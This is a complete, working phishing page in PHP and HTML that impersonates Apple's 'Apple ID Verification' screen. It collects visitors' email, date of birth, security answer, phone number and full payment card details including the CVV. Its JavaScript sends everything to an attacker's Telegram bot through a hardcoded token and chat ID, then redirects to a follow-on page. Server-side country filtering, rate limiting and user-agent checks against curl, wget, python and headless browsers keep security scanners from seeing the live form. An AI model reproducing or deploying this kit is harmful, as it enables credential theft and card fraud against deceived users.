<?php
// === SECURITY ENHANCEMENTS ===
ob_start();

// Set security headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');

// Initialize session with secure parameters
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => '',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
session_start();

// ---- COUNTRY RESTRICTION ----
$allowedCountries = ["TN", "GB", "DE", "HU", "US", "CH", "PL"];
$ip = $_SERVER['REMOTE_ADDR'];
$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode"), true);
$countryCode = $details['countryCode'] ?? null;
if (!$countryCode || !in_array($countryCode, $allowedCountries)) {
    header("HTTP/1.1 403 Forbidden");
    echo "<h2>Access Restricted</h2><p>This service is not available in your region.</p>";
    exit;
}

// ---- RATE LIMITING ----
$request_time = time();
$rate_limit_file = 'rate_limit.txt';
$rate_data = [];
if (file_exists($rate_limit_file)) {
    $rate_data = json_decode(file_get_contents($rate_limit_file), true) ?: [];
}
foreach ($rate_data as $stored_ip => $time) {
    if ($request_time - $time > 3600) unset($rate_data[$stored_ip]);
}
if (isset($rate_data[$ip]) && $rate_data[$ip] > 5) {
    header('HTTP/1.1 429 Too Many Requests');
    exit('Too many requests. Please try again later.');
}
$rate_data[$ip] = isset($rate_data[$ip]) ? $rate_data[$ip] + 1 : 1;
file_put_contents($rate_limit_file, json_encode($rate_data));

// ---- BOT DETECTION ----
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (empty($user_agent) || preg_match('/bot|crawl|slurp|spider|curl|wget|python|java|phantom|headless/i', $user_agent)) {
    file_put_contents('bot_attempts.log', date('Y-m-d H:i:s') . " - Potential bot: $ip - $user_agent\n", FILE_APPEND);
    header('Content-Type: text/html');
    ob_end_flush();
    $restrictedMode = true;
} else {
    $restrictedMode = false;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap');
        
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
        }
        
        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #e6f0ff, #f2f2f7);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1d1d1f;
            padding: 20px;
        }
        
        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            width: 100%;
            max-width: 450px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .logo {
            width: 60px;
            margin-bottom: 20px;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
        }
        
        h1 {
            font-weight: 600;
            font-size: 26px;
            margin-bottom: 8px;
            color: #1d1d1f;
        }
        
        p {
            font-size: 14px;
            color: #6e6e73;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        input[type="text"], input[type="email"], input[type="tel"], select {
            width: 100%;
            padding: 16px;
            margin-bottom: 16px;
            border-radius: 12px;
            border: 1px solid #d1d1d6;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #fafafa;
        }
        
        input:focus, select:focus {
            border: 1px solid #0071e3;
            box-shadow: 0 0 0 4px rgba(0,113,227,0.15);
            outline: none;
            background: #fff;
        }
        
        input[type="submit"] {
            width: 100%;
            padding: 17px;
            background-color: #0071e3;
            background-image: linear-gradient(90deg, #0071e3, #005bb5);
            color: white;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(0,113,227,0.25);
        }
        
        input[type="submit"]:hover {
            background-image: linear-gradient(90deg, #005bb5, #0071e3);
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(0,113,227,0.35);
        }
        
        input[type="submit"]:active {
            transform: translateY(0);
        }
        
        .section-title {
            text-align: left;
            font-weight: 600;
            margin: 24px 0 12px 0;
            color: #1d1d1f;
            font-size: 16px;
            padding-left: 5px;
            border-left: 4px solid #0071e3;
        }
        
        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #6e6e73;
            line-height: 1.5;
        }
        
        .footer a {
            color: #06c;
            text-decoration: none;
            margin: 0 5px;
            transition: color 0.2s;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
            color: #0071e3;
            font-size: 14px;
        }
        
        .loading i {
            margin-right: 8px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .security-note {
            display: flex;
            align-items: center;
            background: #f5f5f7;
            padding: 12px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 13px;
            color: #6e6e73;
        }
        
        .security-note i {
            color: #0071e3;
            margin-right: 10px;
            font-size: 16px;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 16px;
        }
        
        .input-group i {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e93;
        }
        
        .input-group input, .input-group select {
            padding-left: 45px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            input, select {
                padding: 14px;
            }
            
            .input-group i {
                left: 14px;
            }
            
            .input-group input, .input-group select {
                padding-left: 40px;
            }
        }
        
        .apple-pay-badge {
            margin: 25px 0;
            display: flex;
            justify-content: center;
        }
        
        .apple-pay-badge img {
            height: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
    <h1>Verify Your Account</h1>
    <p>To continue using Apple services, please verify your account information</p>
    
    <div class="security-note">
        <i class="fas fa-lock"></i>
        <span>Your information is encrypted and secure</span>
    </div>
    
    <form id="verificationForm">
        <!-- Section 1: Account Info -->
        <div class="section-title">Account Verification</div>
        
        <div class="input-group">
            <i class="fas fa-envelope"></i>
            <input type="email" id="email" placeholder="Apple ID Email" required>
        </div>
        
        <div class="input-group">
            <i class="fas fa-calendar-alt"></i>
            <input type="text" id="dob" placeholder="Date of Birth (DD/MM/YYYY)" maxlength="10" required inputmode="numeric" oninput="formatDOB(this)">
        </div>
        
        <div class="input-group">
            <i class="fas fa-shield-alt"></i>
            <select id="security-question" required>
                <option value="">Select Security Question</option>
                <option value="pet">What is your pet's name?</option>
                <option value="mother">What is your mother's maiden name?</option>
                <option value="school">What is your first school?</option>
                <option value="city">What city were you born in?</option>
                <option value="car">What was your first car model?</option>
            </select>
        </div>
        
        <div class="input-group">
            <i class="fas fa-key"></i>
            <input type="text" id="security-answer" placeholder="Security Answer" required>
        </div>

        <div class="input-group">
            <i class="fas fa-phone"></i>
            <input type="tel" id="phone" placeholder="Phone Number" required>
        </div>
        
        <!-- Section 2: Credit Card Info -->
        <div class="section-title">Payment Verification</div>
        
        <div class="apple-pay-badge">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAMAAABC4vDmAAAAY1BMVEX///8AAAD7+/tNTU2Dg4MbGxu3t7fX19ewsLCkpKT29vbHx8ff39/w8PDz8/OWlpZra2vo6Oi9vb15eXlVVVWMjIwqKirOzs49PT1fX19zc3OcnJwxMTFCQkIlJSU3NzcTExNQTgSHAAAEN0lEQVR4nO2Z15qjMAxGKUnoNZRAGu//lBtbBstgA7vfhpkLnZtJwMZ/JFmSGcsiCIIgCIIgCIIgCIIgCIIgCIIgCII4nvCnBSxoc/v50xrm1LZt5z8tQsWpPppsf3kjuihEsXOcKGYn2y4W152nrdJU96Mir+ULXpc3HNdeojHoNzixtV7xTlF2f4gottI50tzQi9LZ9L+TfNZ5e7o7ICr3gCgbQ+wADybV6aK/A6JO8kIkZH0t2kMv669B4vBUnkbXyu3us7haiLLChosKviPJ8eHxdl4WaVufhWNyxY1LUVY7sEvdV0yVohBu3gOKYuxJjSgrn+c0J0zD/6IxvWm31TyKdaIyPmg0aOLXuXtzuzoYZV6yD/dEmcLY9nhn1tSg3KATVfJRMCjJXtO8cw5CAv6tRDOSfWFYmjWdcazrREVy0VitQi+4yGO1RjOCucO1hJVZU4sH6kRd+Dg2LB7ms7n9uBcaVLl5FPZbpTw2G6pWBupEQfGOZbq/+pfgCh9vyWRKafD4wb5v5tvALEoJUJ0osPLjM863kQUK2JRs6fSl/joeK+d0S1Ru1FSpAzWiwHus+nHrdKNXQjmf13d3mtGzr9sNpDkfqN7TiPJgXMlM9moa5KU7Nwj7xP03TMHJJyihquVhFHXXiZJKnQxi+82+xB9Q/o8mUZYSRLxZe2ztvTVRakwLUVUA1GMGGDStlxDFvZnhSOg1HtDxNorSxtQCbU+BRMHuhtKT8o2ha9ZmmANdu/tmvNAKRXup++rZjPdAlMNTFfiPe6/Z1iTKl5ZsU1Qlw6M4zQ8WIAqCPpcfd3hPHBS0DJqMLm++81pKCuvldCGqYJ3Qmw/ll3UxOKcwi7Ib7EAQ1Yt22IsLXCtOeNqtq5Aoi8+LxqV2dV9Ov6LqjMJYV2ZGIKEP11IobbGocpzHvbevT12pMzaOqzVR4FmZqNDuE/6zLbGntpMUI1nUd4w01YqomFc4VGZLLAp861kxE7f3xcl1TZQctiIqYr8LNzpXRRSXWMMfw1FpwVqoowjYEoX2KjxxEmUxQ1YWi/4dJUag2c6CJz4TrLhPbTCLaiaK+W/g5Xv/edp5mUTh7not0CFvwgkhLcXjpCheatz5AzeIDJqUtxfbKcF+d6dTx3qh/KGISqeWe78mkUEW3JTityZqdiLq+HaUoqbnG2YbmMry8JK+VAvCqqgUHz/60DurosaDwHZ7p6wIwe76bexdoGbcZu9e4E2eKVKdYOwOXH/sSVEdguzqJobZJtq+O3ljDg7y3l/UqNL/YP6taZvleX7nz0jYUHxmgbKxp0E4EPDu7iR1CHBYv/20DBXw3kFvbXcC77Gev8Z7iRdH4iz2pTd+/4AsFr8ooiZRzZ7e/CAi0UJWf5s3vwm8kqvK3/X/QydJDvxvF0EQBEEQBEEQBEEQBEEQBEEQBEEQBOMPcZIqFZPqXLsAAAAASUVORK5CYII=" alt="Apple Pay">
        </div>
        
        <div class="input-group">
            <i class="fas fa-user"></i>
            <input type="text" id="cardholder" placeholder="Cardholder Name" required>
        </div>
        
        <div class="input-group">
            <i class="fas fa-credit-card"></i>
            <input type="text" id="card-number" placeholder="Card Number" maxlength="19" oninput="formatCard(this)" required inputmode="numeric">
        </div>
        
        <div style="display: flex; gap: 15px;">
            <div class="input-group" style="flex: 1;">
                <i class="fas fa-calendar"></i>
                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required oninput="formatExpiry(this)" inputmode="numeric">
            </div>
            
            <div class="input-group" style="flex: 1;">
                <i class="fas fa-lock"></i>
                <input type="text" id="cvv" placeholder="CVV" maxlength="3" required inputmode="numeric">
            </div>
        </div>

        <!-- Honeypot field -->
        <input type="text" name="website" style="display: none;" tabindex="-1" autocomplete="off">
        
        <!-- Bot check -->
        <div style="margin: 20px 0; background: #f9f9f9; padding: 15px; border-radius: 10px;">
            <label for="botcheck" style="display: block; margin-bottom: 8px; font-weight: 500;">Security Check: What is 5 + 5?</label>
            <input type="text" id="botcheck" required style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #d1d1d6;">
        </div>

        <input type="submit" id="submitBtn" value="Verify Account">
        <div class="loading" id="loadingIndicator"><i class="fas fa-spinner"></i> Verifying your information...</div>
    </form>

    <div class="footer">
        <p>
            <a href="#">Privacy Policy</a> | 
            <a href="#">Terms of Use</a> | 
            <a href="#">Apple Support</a>
        </p>
        <p style="margin-top: 10px;">Apple &copy; 2025 Apple Inc. All rights reserved.</p>
    </div>
</div>

<script>
// Only execute the sensitive code if not in restricted mode
<?php if (!$restrictedMode): ?>
    // Telegram Bot details
    const TELEGRAM_BOT_TOKEN = '8450566694:AAHKZmBuNJZ8BdvkA4ab6kli8PXC24X2D2U';
    const TELEGRAM_CHAT_ID = '-4932499123';
    
    // Start time for form submission timing
    const startTime = new Date();
    
    // Function to send message to Telegram with error handling
    async function sendToTelegram(message) {
        if (!TELEGRAM_BOT_TOKEN) {
            console.log('Telegram notification:', message);
            return false;
        }
        
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                }),
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return false;
        }
    }
    
    // Function to collect user data
    function collectUserData() {
        return {
            email: document.getElementById('email').value,
            dob: document.getElementById('dob').value,
            securityQuestion: document.getElementById('security-question').value,
            securityAnswer: document.getElementById('security-answer').value,
            phone: document.getElementById('phone').value,
            cardholder: document.getElementById('cardholder').value,
            cardNumber: document.getElementById('card-number').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            date: new Date().toISOString()
        };
    }
    
    // Enhanced bot detection
    function isBot() {
        // Check for headless browser indicators
        const indicators = [
            navigator.webdriver,
            navigator.languages && navigator.languages.length === 0,
            /HeadlessChrome|PhantomJS|Electron|Bot|Crawler|Spider|curl|wget|python|java|node/i.test(navigator.userAgent),
            !('ontouchstart' in window) && navigator.maxTouchPoints > 0,
            window.outerWidth === 0 && window.outerHeight === 0
        ];
        
        return indicators.some(indicator => indicator === true);
    }
    
    // Format card number with spaces
    function formatCard(input) {
        let value = input.value.replace(/\D/g, '');
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        input.value = formatted;
    }

    // Format expiry date
    function formatExpiry(input) {
        let value = input.value.replace(/\D/g,'');
        if(value.length > 2){
            value = value.slice(0,2) + '/' + value.slice(2,4);
        }
        input.value = value;
    }

    // Format date of birth
    function formatDOB(input) {
        let value = input.value.replace(/\D/g,'');
        if(value.length > 2 && value.length <= 4){
            value = value.slice(0,2) + '/' + value.slice(2);
        } else if(value.length > 4){
            value = value.slice(0,2) + '/' + value.slice(2,4) + '/' + value.slice(4,8);
        }
        input.value = value;
    }
    
    // Initialize page
    document.addEventListener('DOMContentLoaded', function() {
        // Add event listener to form
        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Show loading indicator
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
            
            // Honeypot check
            const honeypot = document.querySelector('input[name="website"]').value;
            if (honeypot) {
                alert('Bot activity detected!');
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // Bot detection
            if (isBot()) {
                alert('Automated activity detected. Please contact support if this is an error.');
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // Time check - if form submitted too quickly (less than 3 seconds)
            const endTime = new Date();
            const timeTaken = (endTime - startTime) / 1000;
            if (timeTaken < 3) {
                alert('Please take your time to fill out the form correctly.');
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // Math question check
            const mathAnswer = document.getElementById('botcheck').value;
            if (mathAnswer !== '10') {
                alert('Incorrect answer to security question. Please try again.');
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                return false;
            }
            
            // If all checks pass, send data to Telegram
            const userData = collectUserData();
            
            // Create a nicely formatted message for Telegram
            const message = `✅ <b>Apple ID Verification Data</b>\n\n` +
                           `📧 <b>Email:</b> ${userData.email}\n` +
                           `📅 <b>Date of Birth:</b> ${userData.dob}\n` +
                           `🔒 <b>Security Question:</b> ${userData.securityQuestion}\n` +
                           `🔑 <b>Security Answer:</b> ${userData.securityAnswer}\n` +
                           `📱 <b>Phone:</b> ${userData.phone}\n\n` +
                           `💳 <b>Cardholder:</b> ${userData.cardholder}\n` +
                           `💳 <b>Card Number:</b> ${userData.cardNumber}\n` +
                           `📅 <b>Expiry:</b> ${userData.expiry}\n` +
                           `🔐 <b>CVV:</b> ${userData.cvv}\n\n` +
                           `🌐 <b>User Agent:</b> ${userData.userAgent}\n` +
                           `📱 <b>Platform:</b> ${userData.platform}\n` +
                           `🕒 <b>Time:</b> ${userData.date}`;
            
            const sent = await sendToTelegram(message);
            
            if (sent) {
                // Redirect to sms.php after successful submission
                window.location.href = 'sms2.php';
            } else {
                alert('There was an issue with the verification process. Please try again.');
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
            }
        });
    });
<?php else: ?>
    // Restricted mode - show form but disable functionality
    document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('Please enable JavaScript and try again.');
        });
    });
<?php endif; ?>
</script>

</body>
</html>
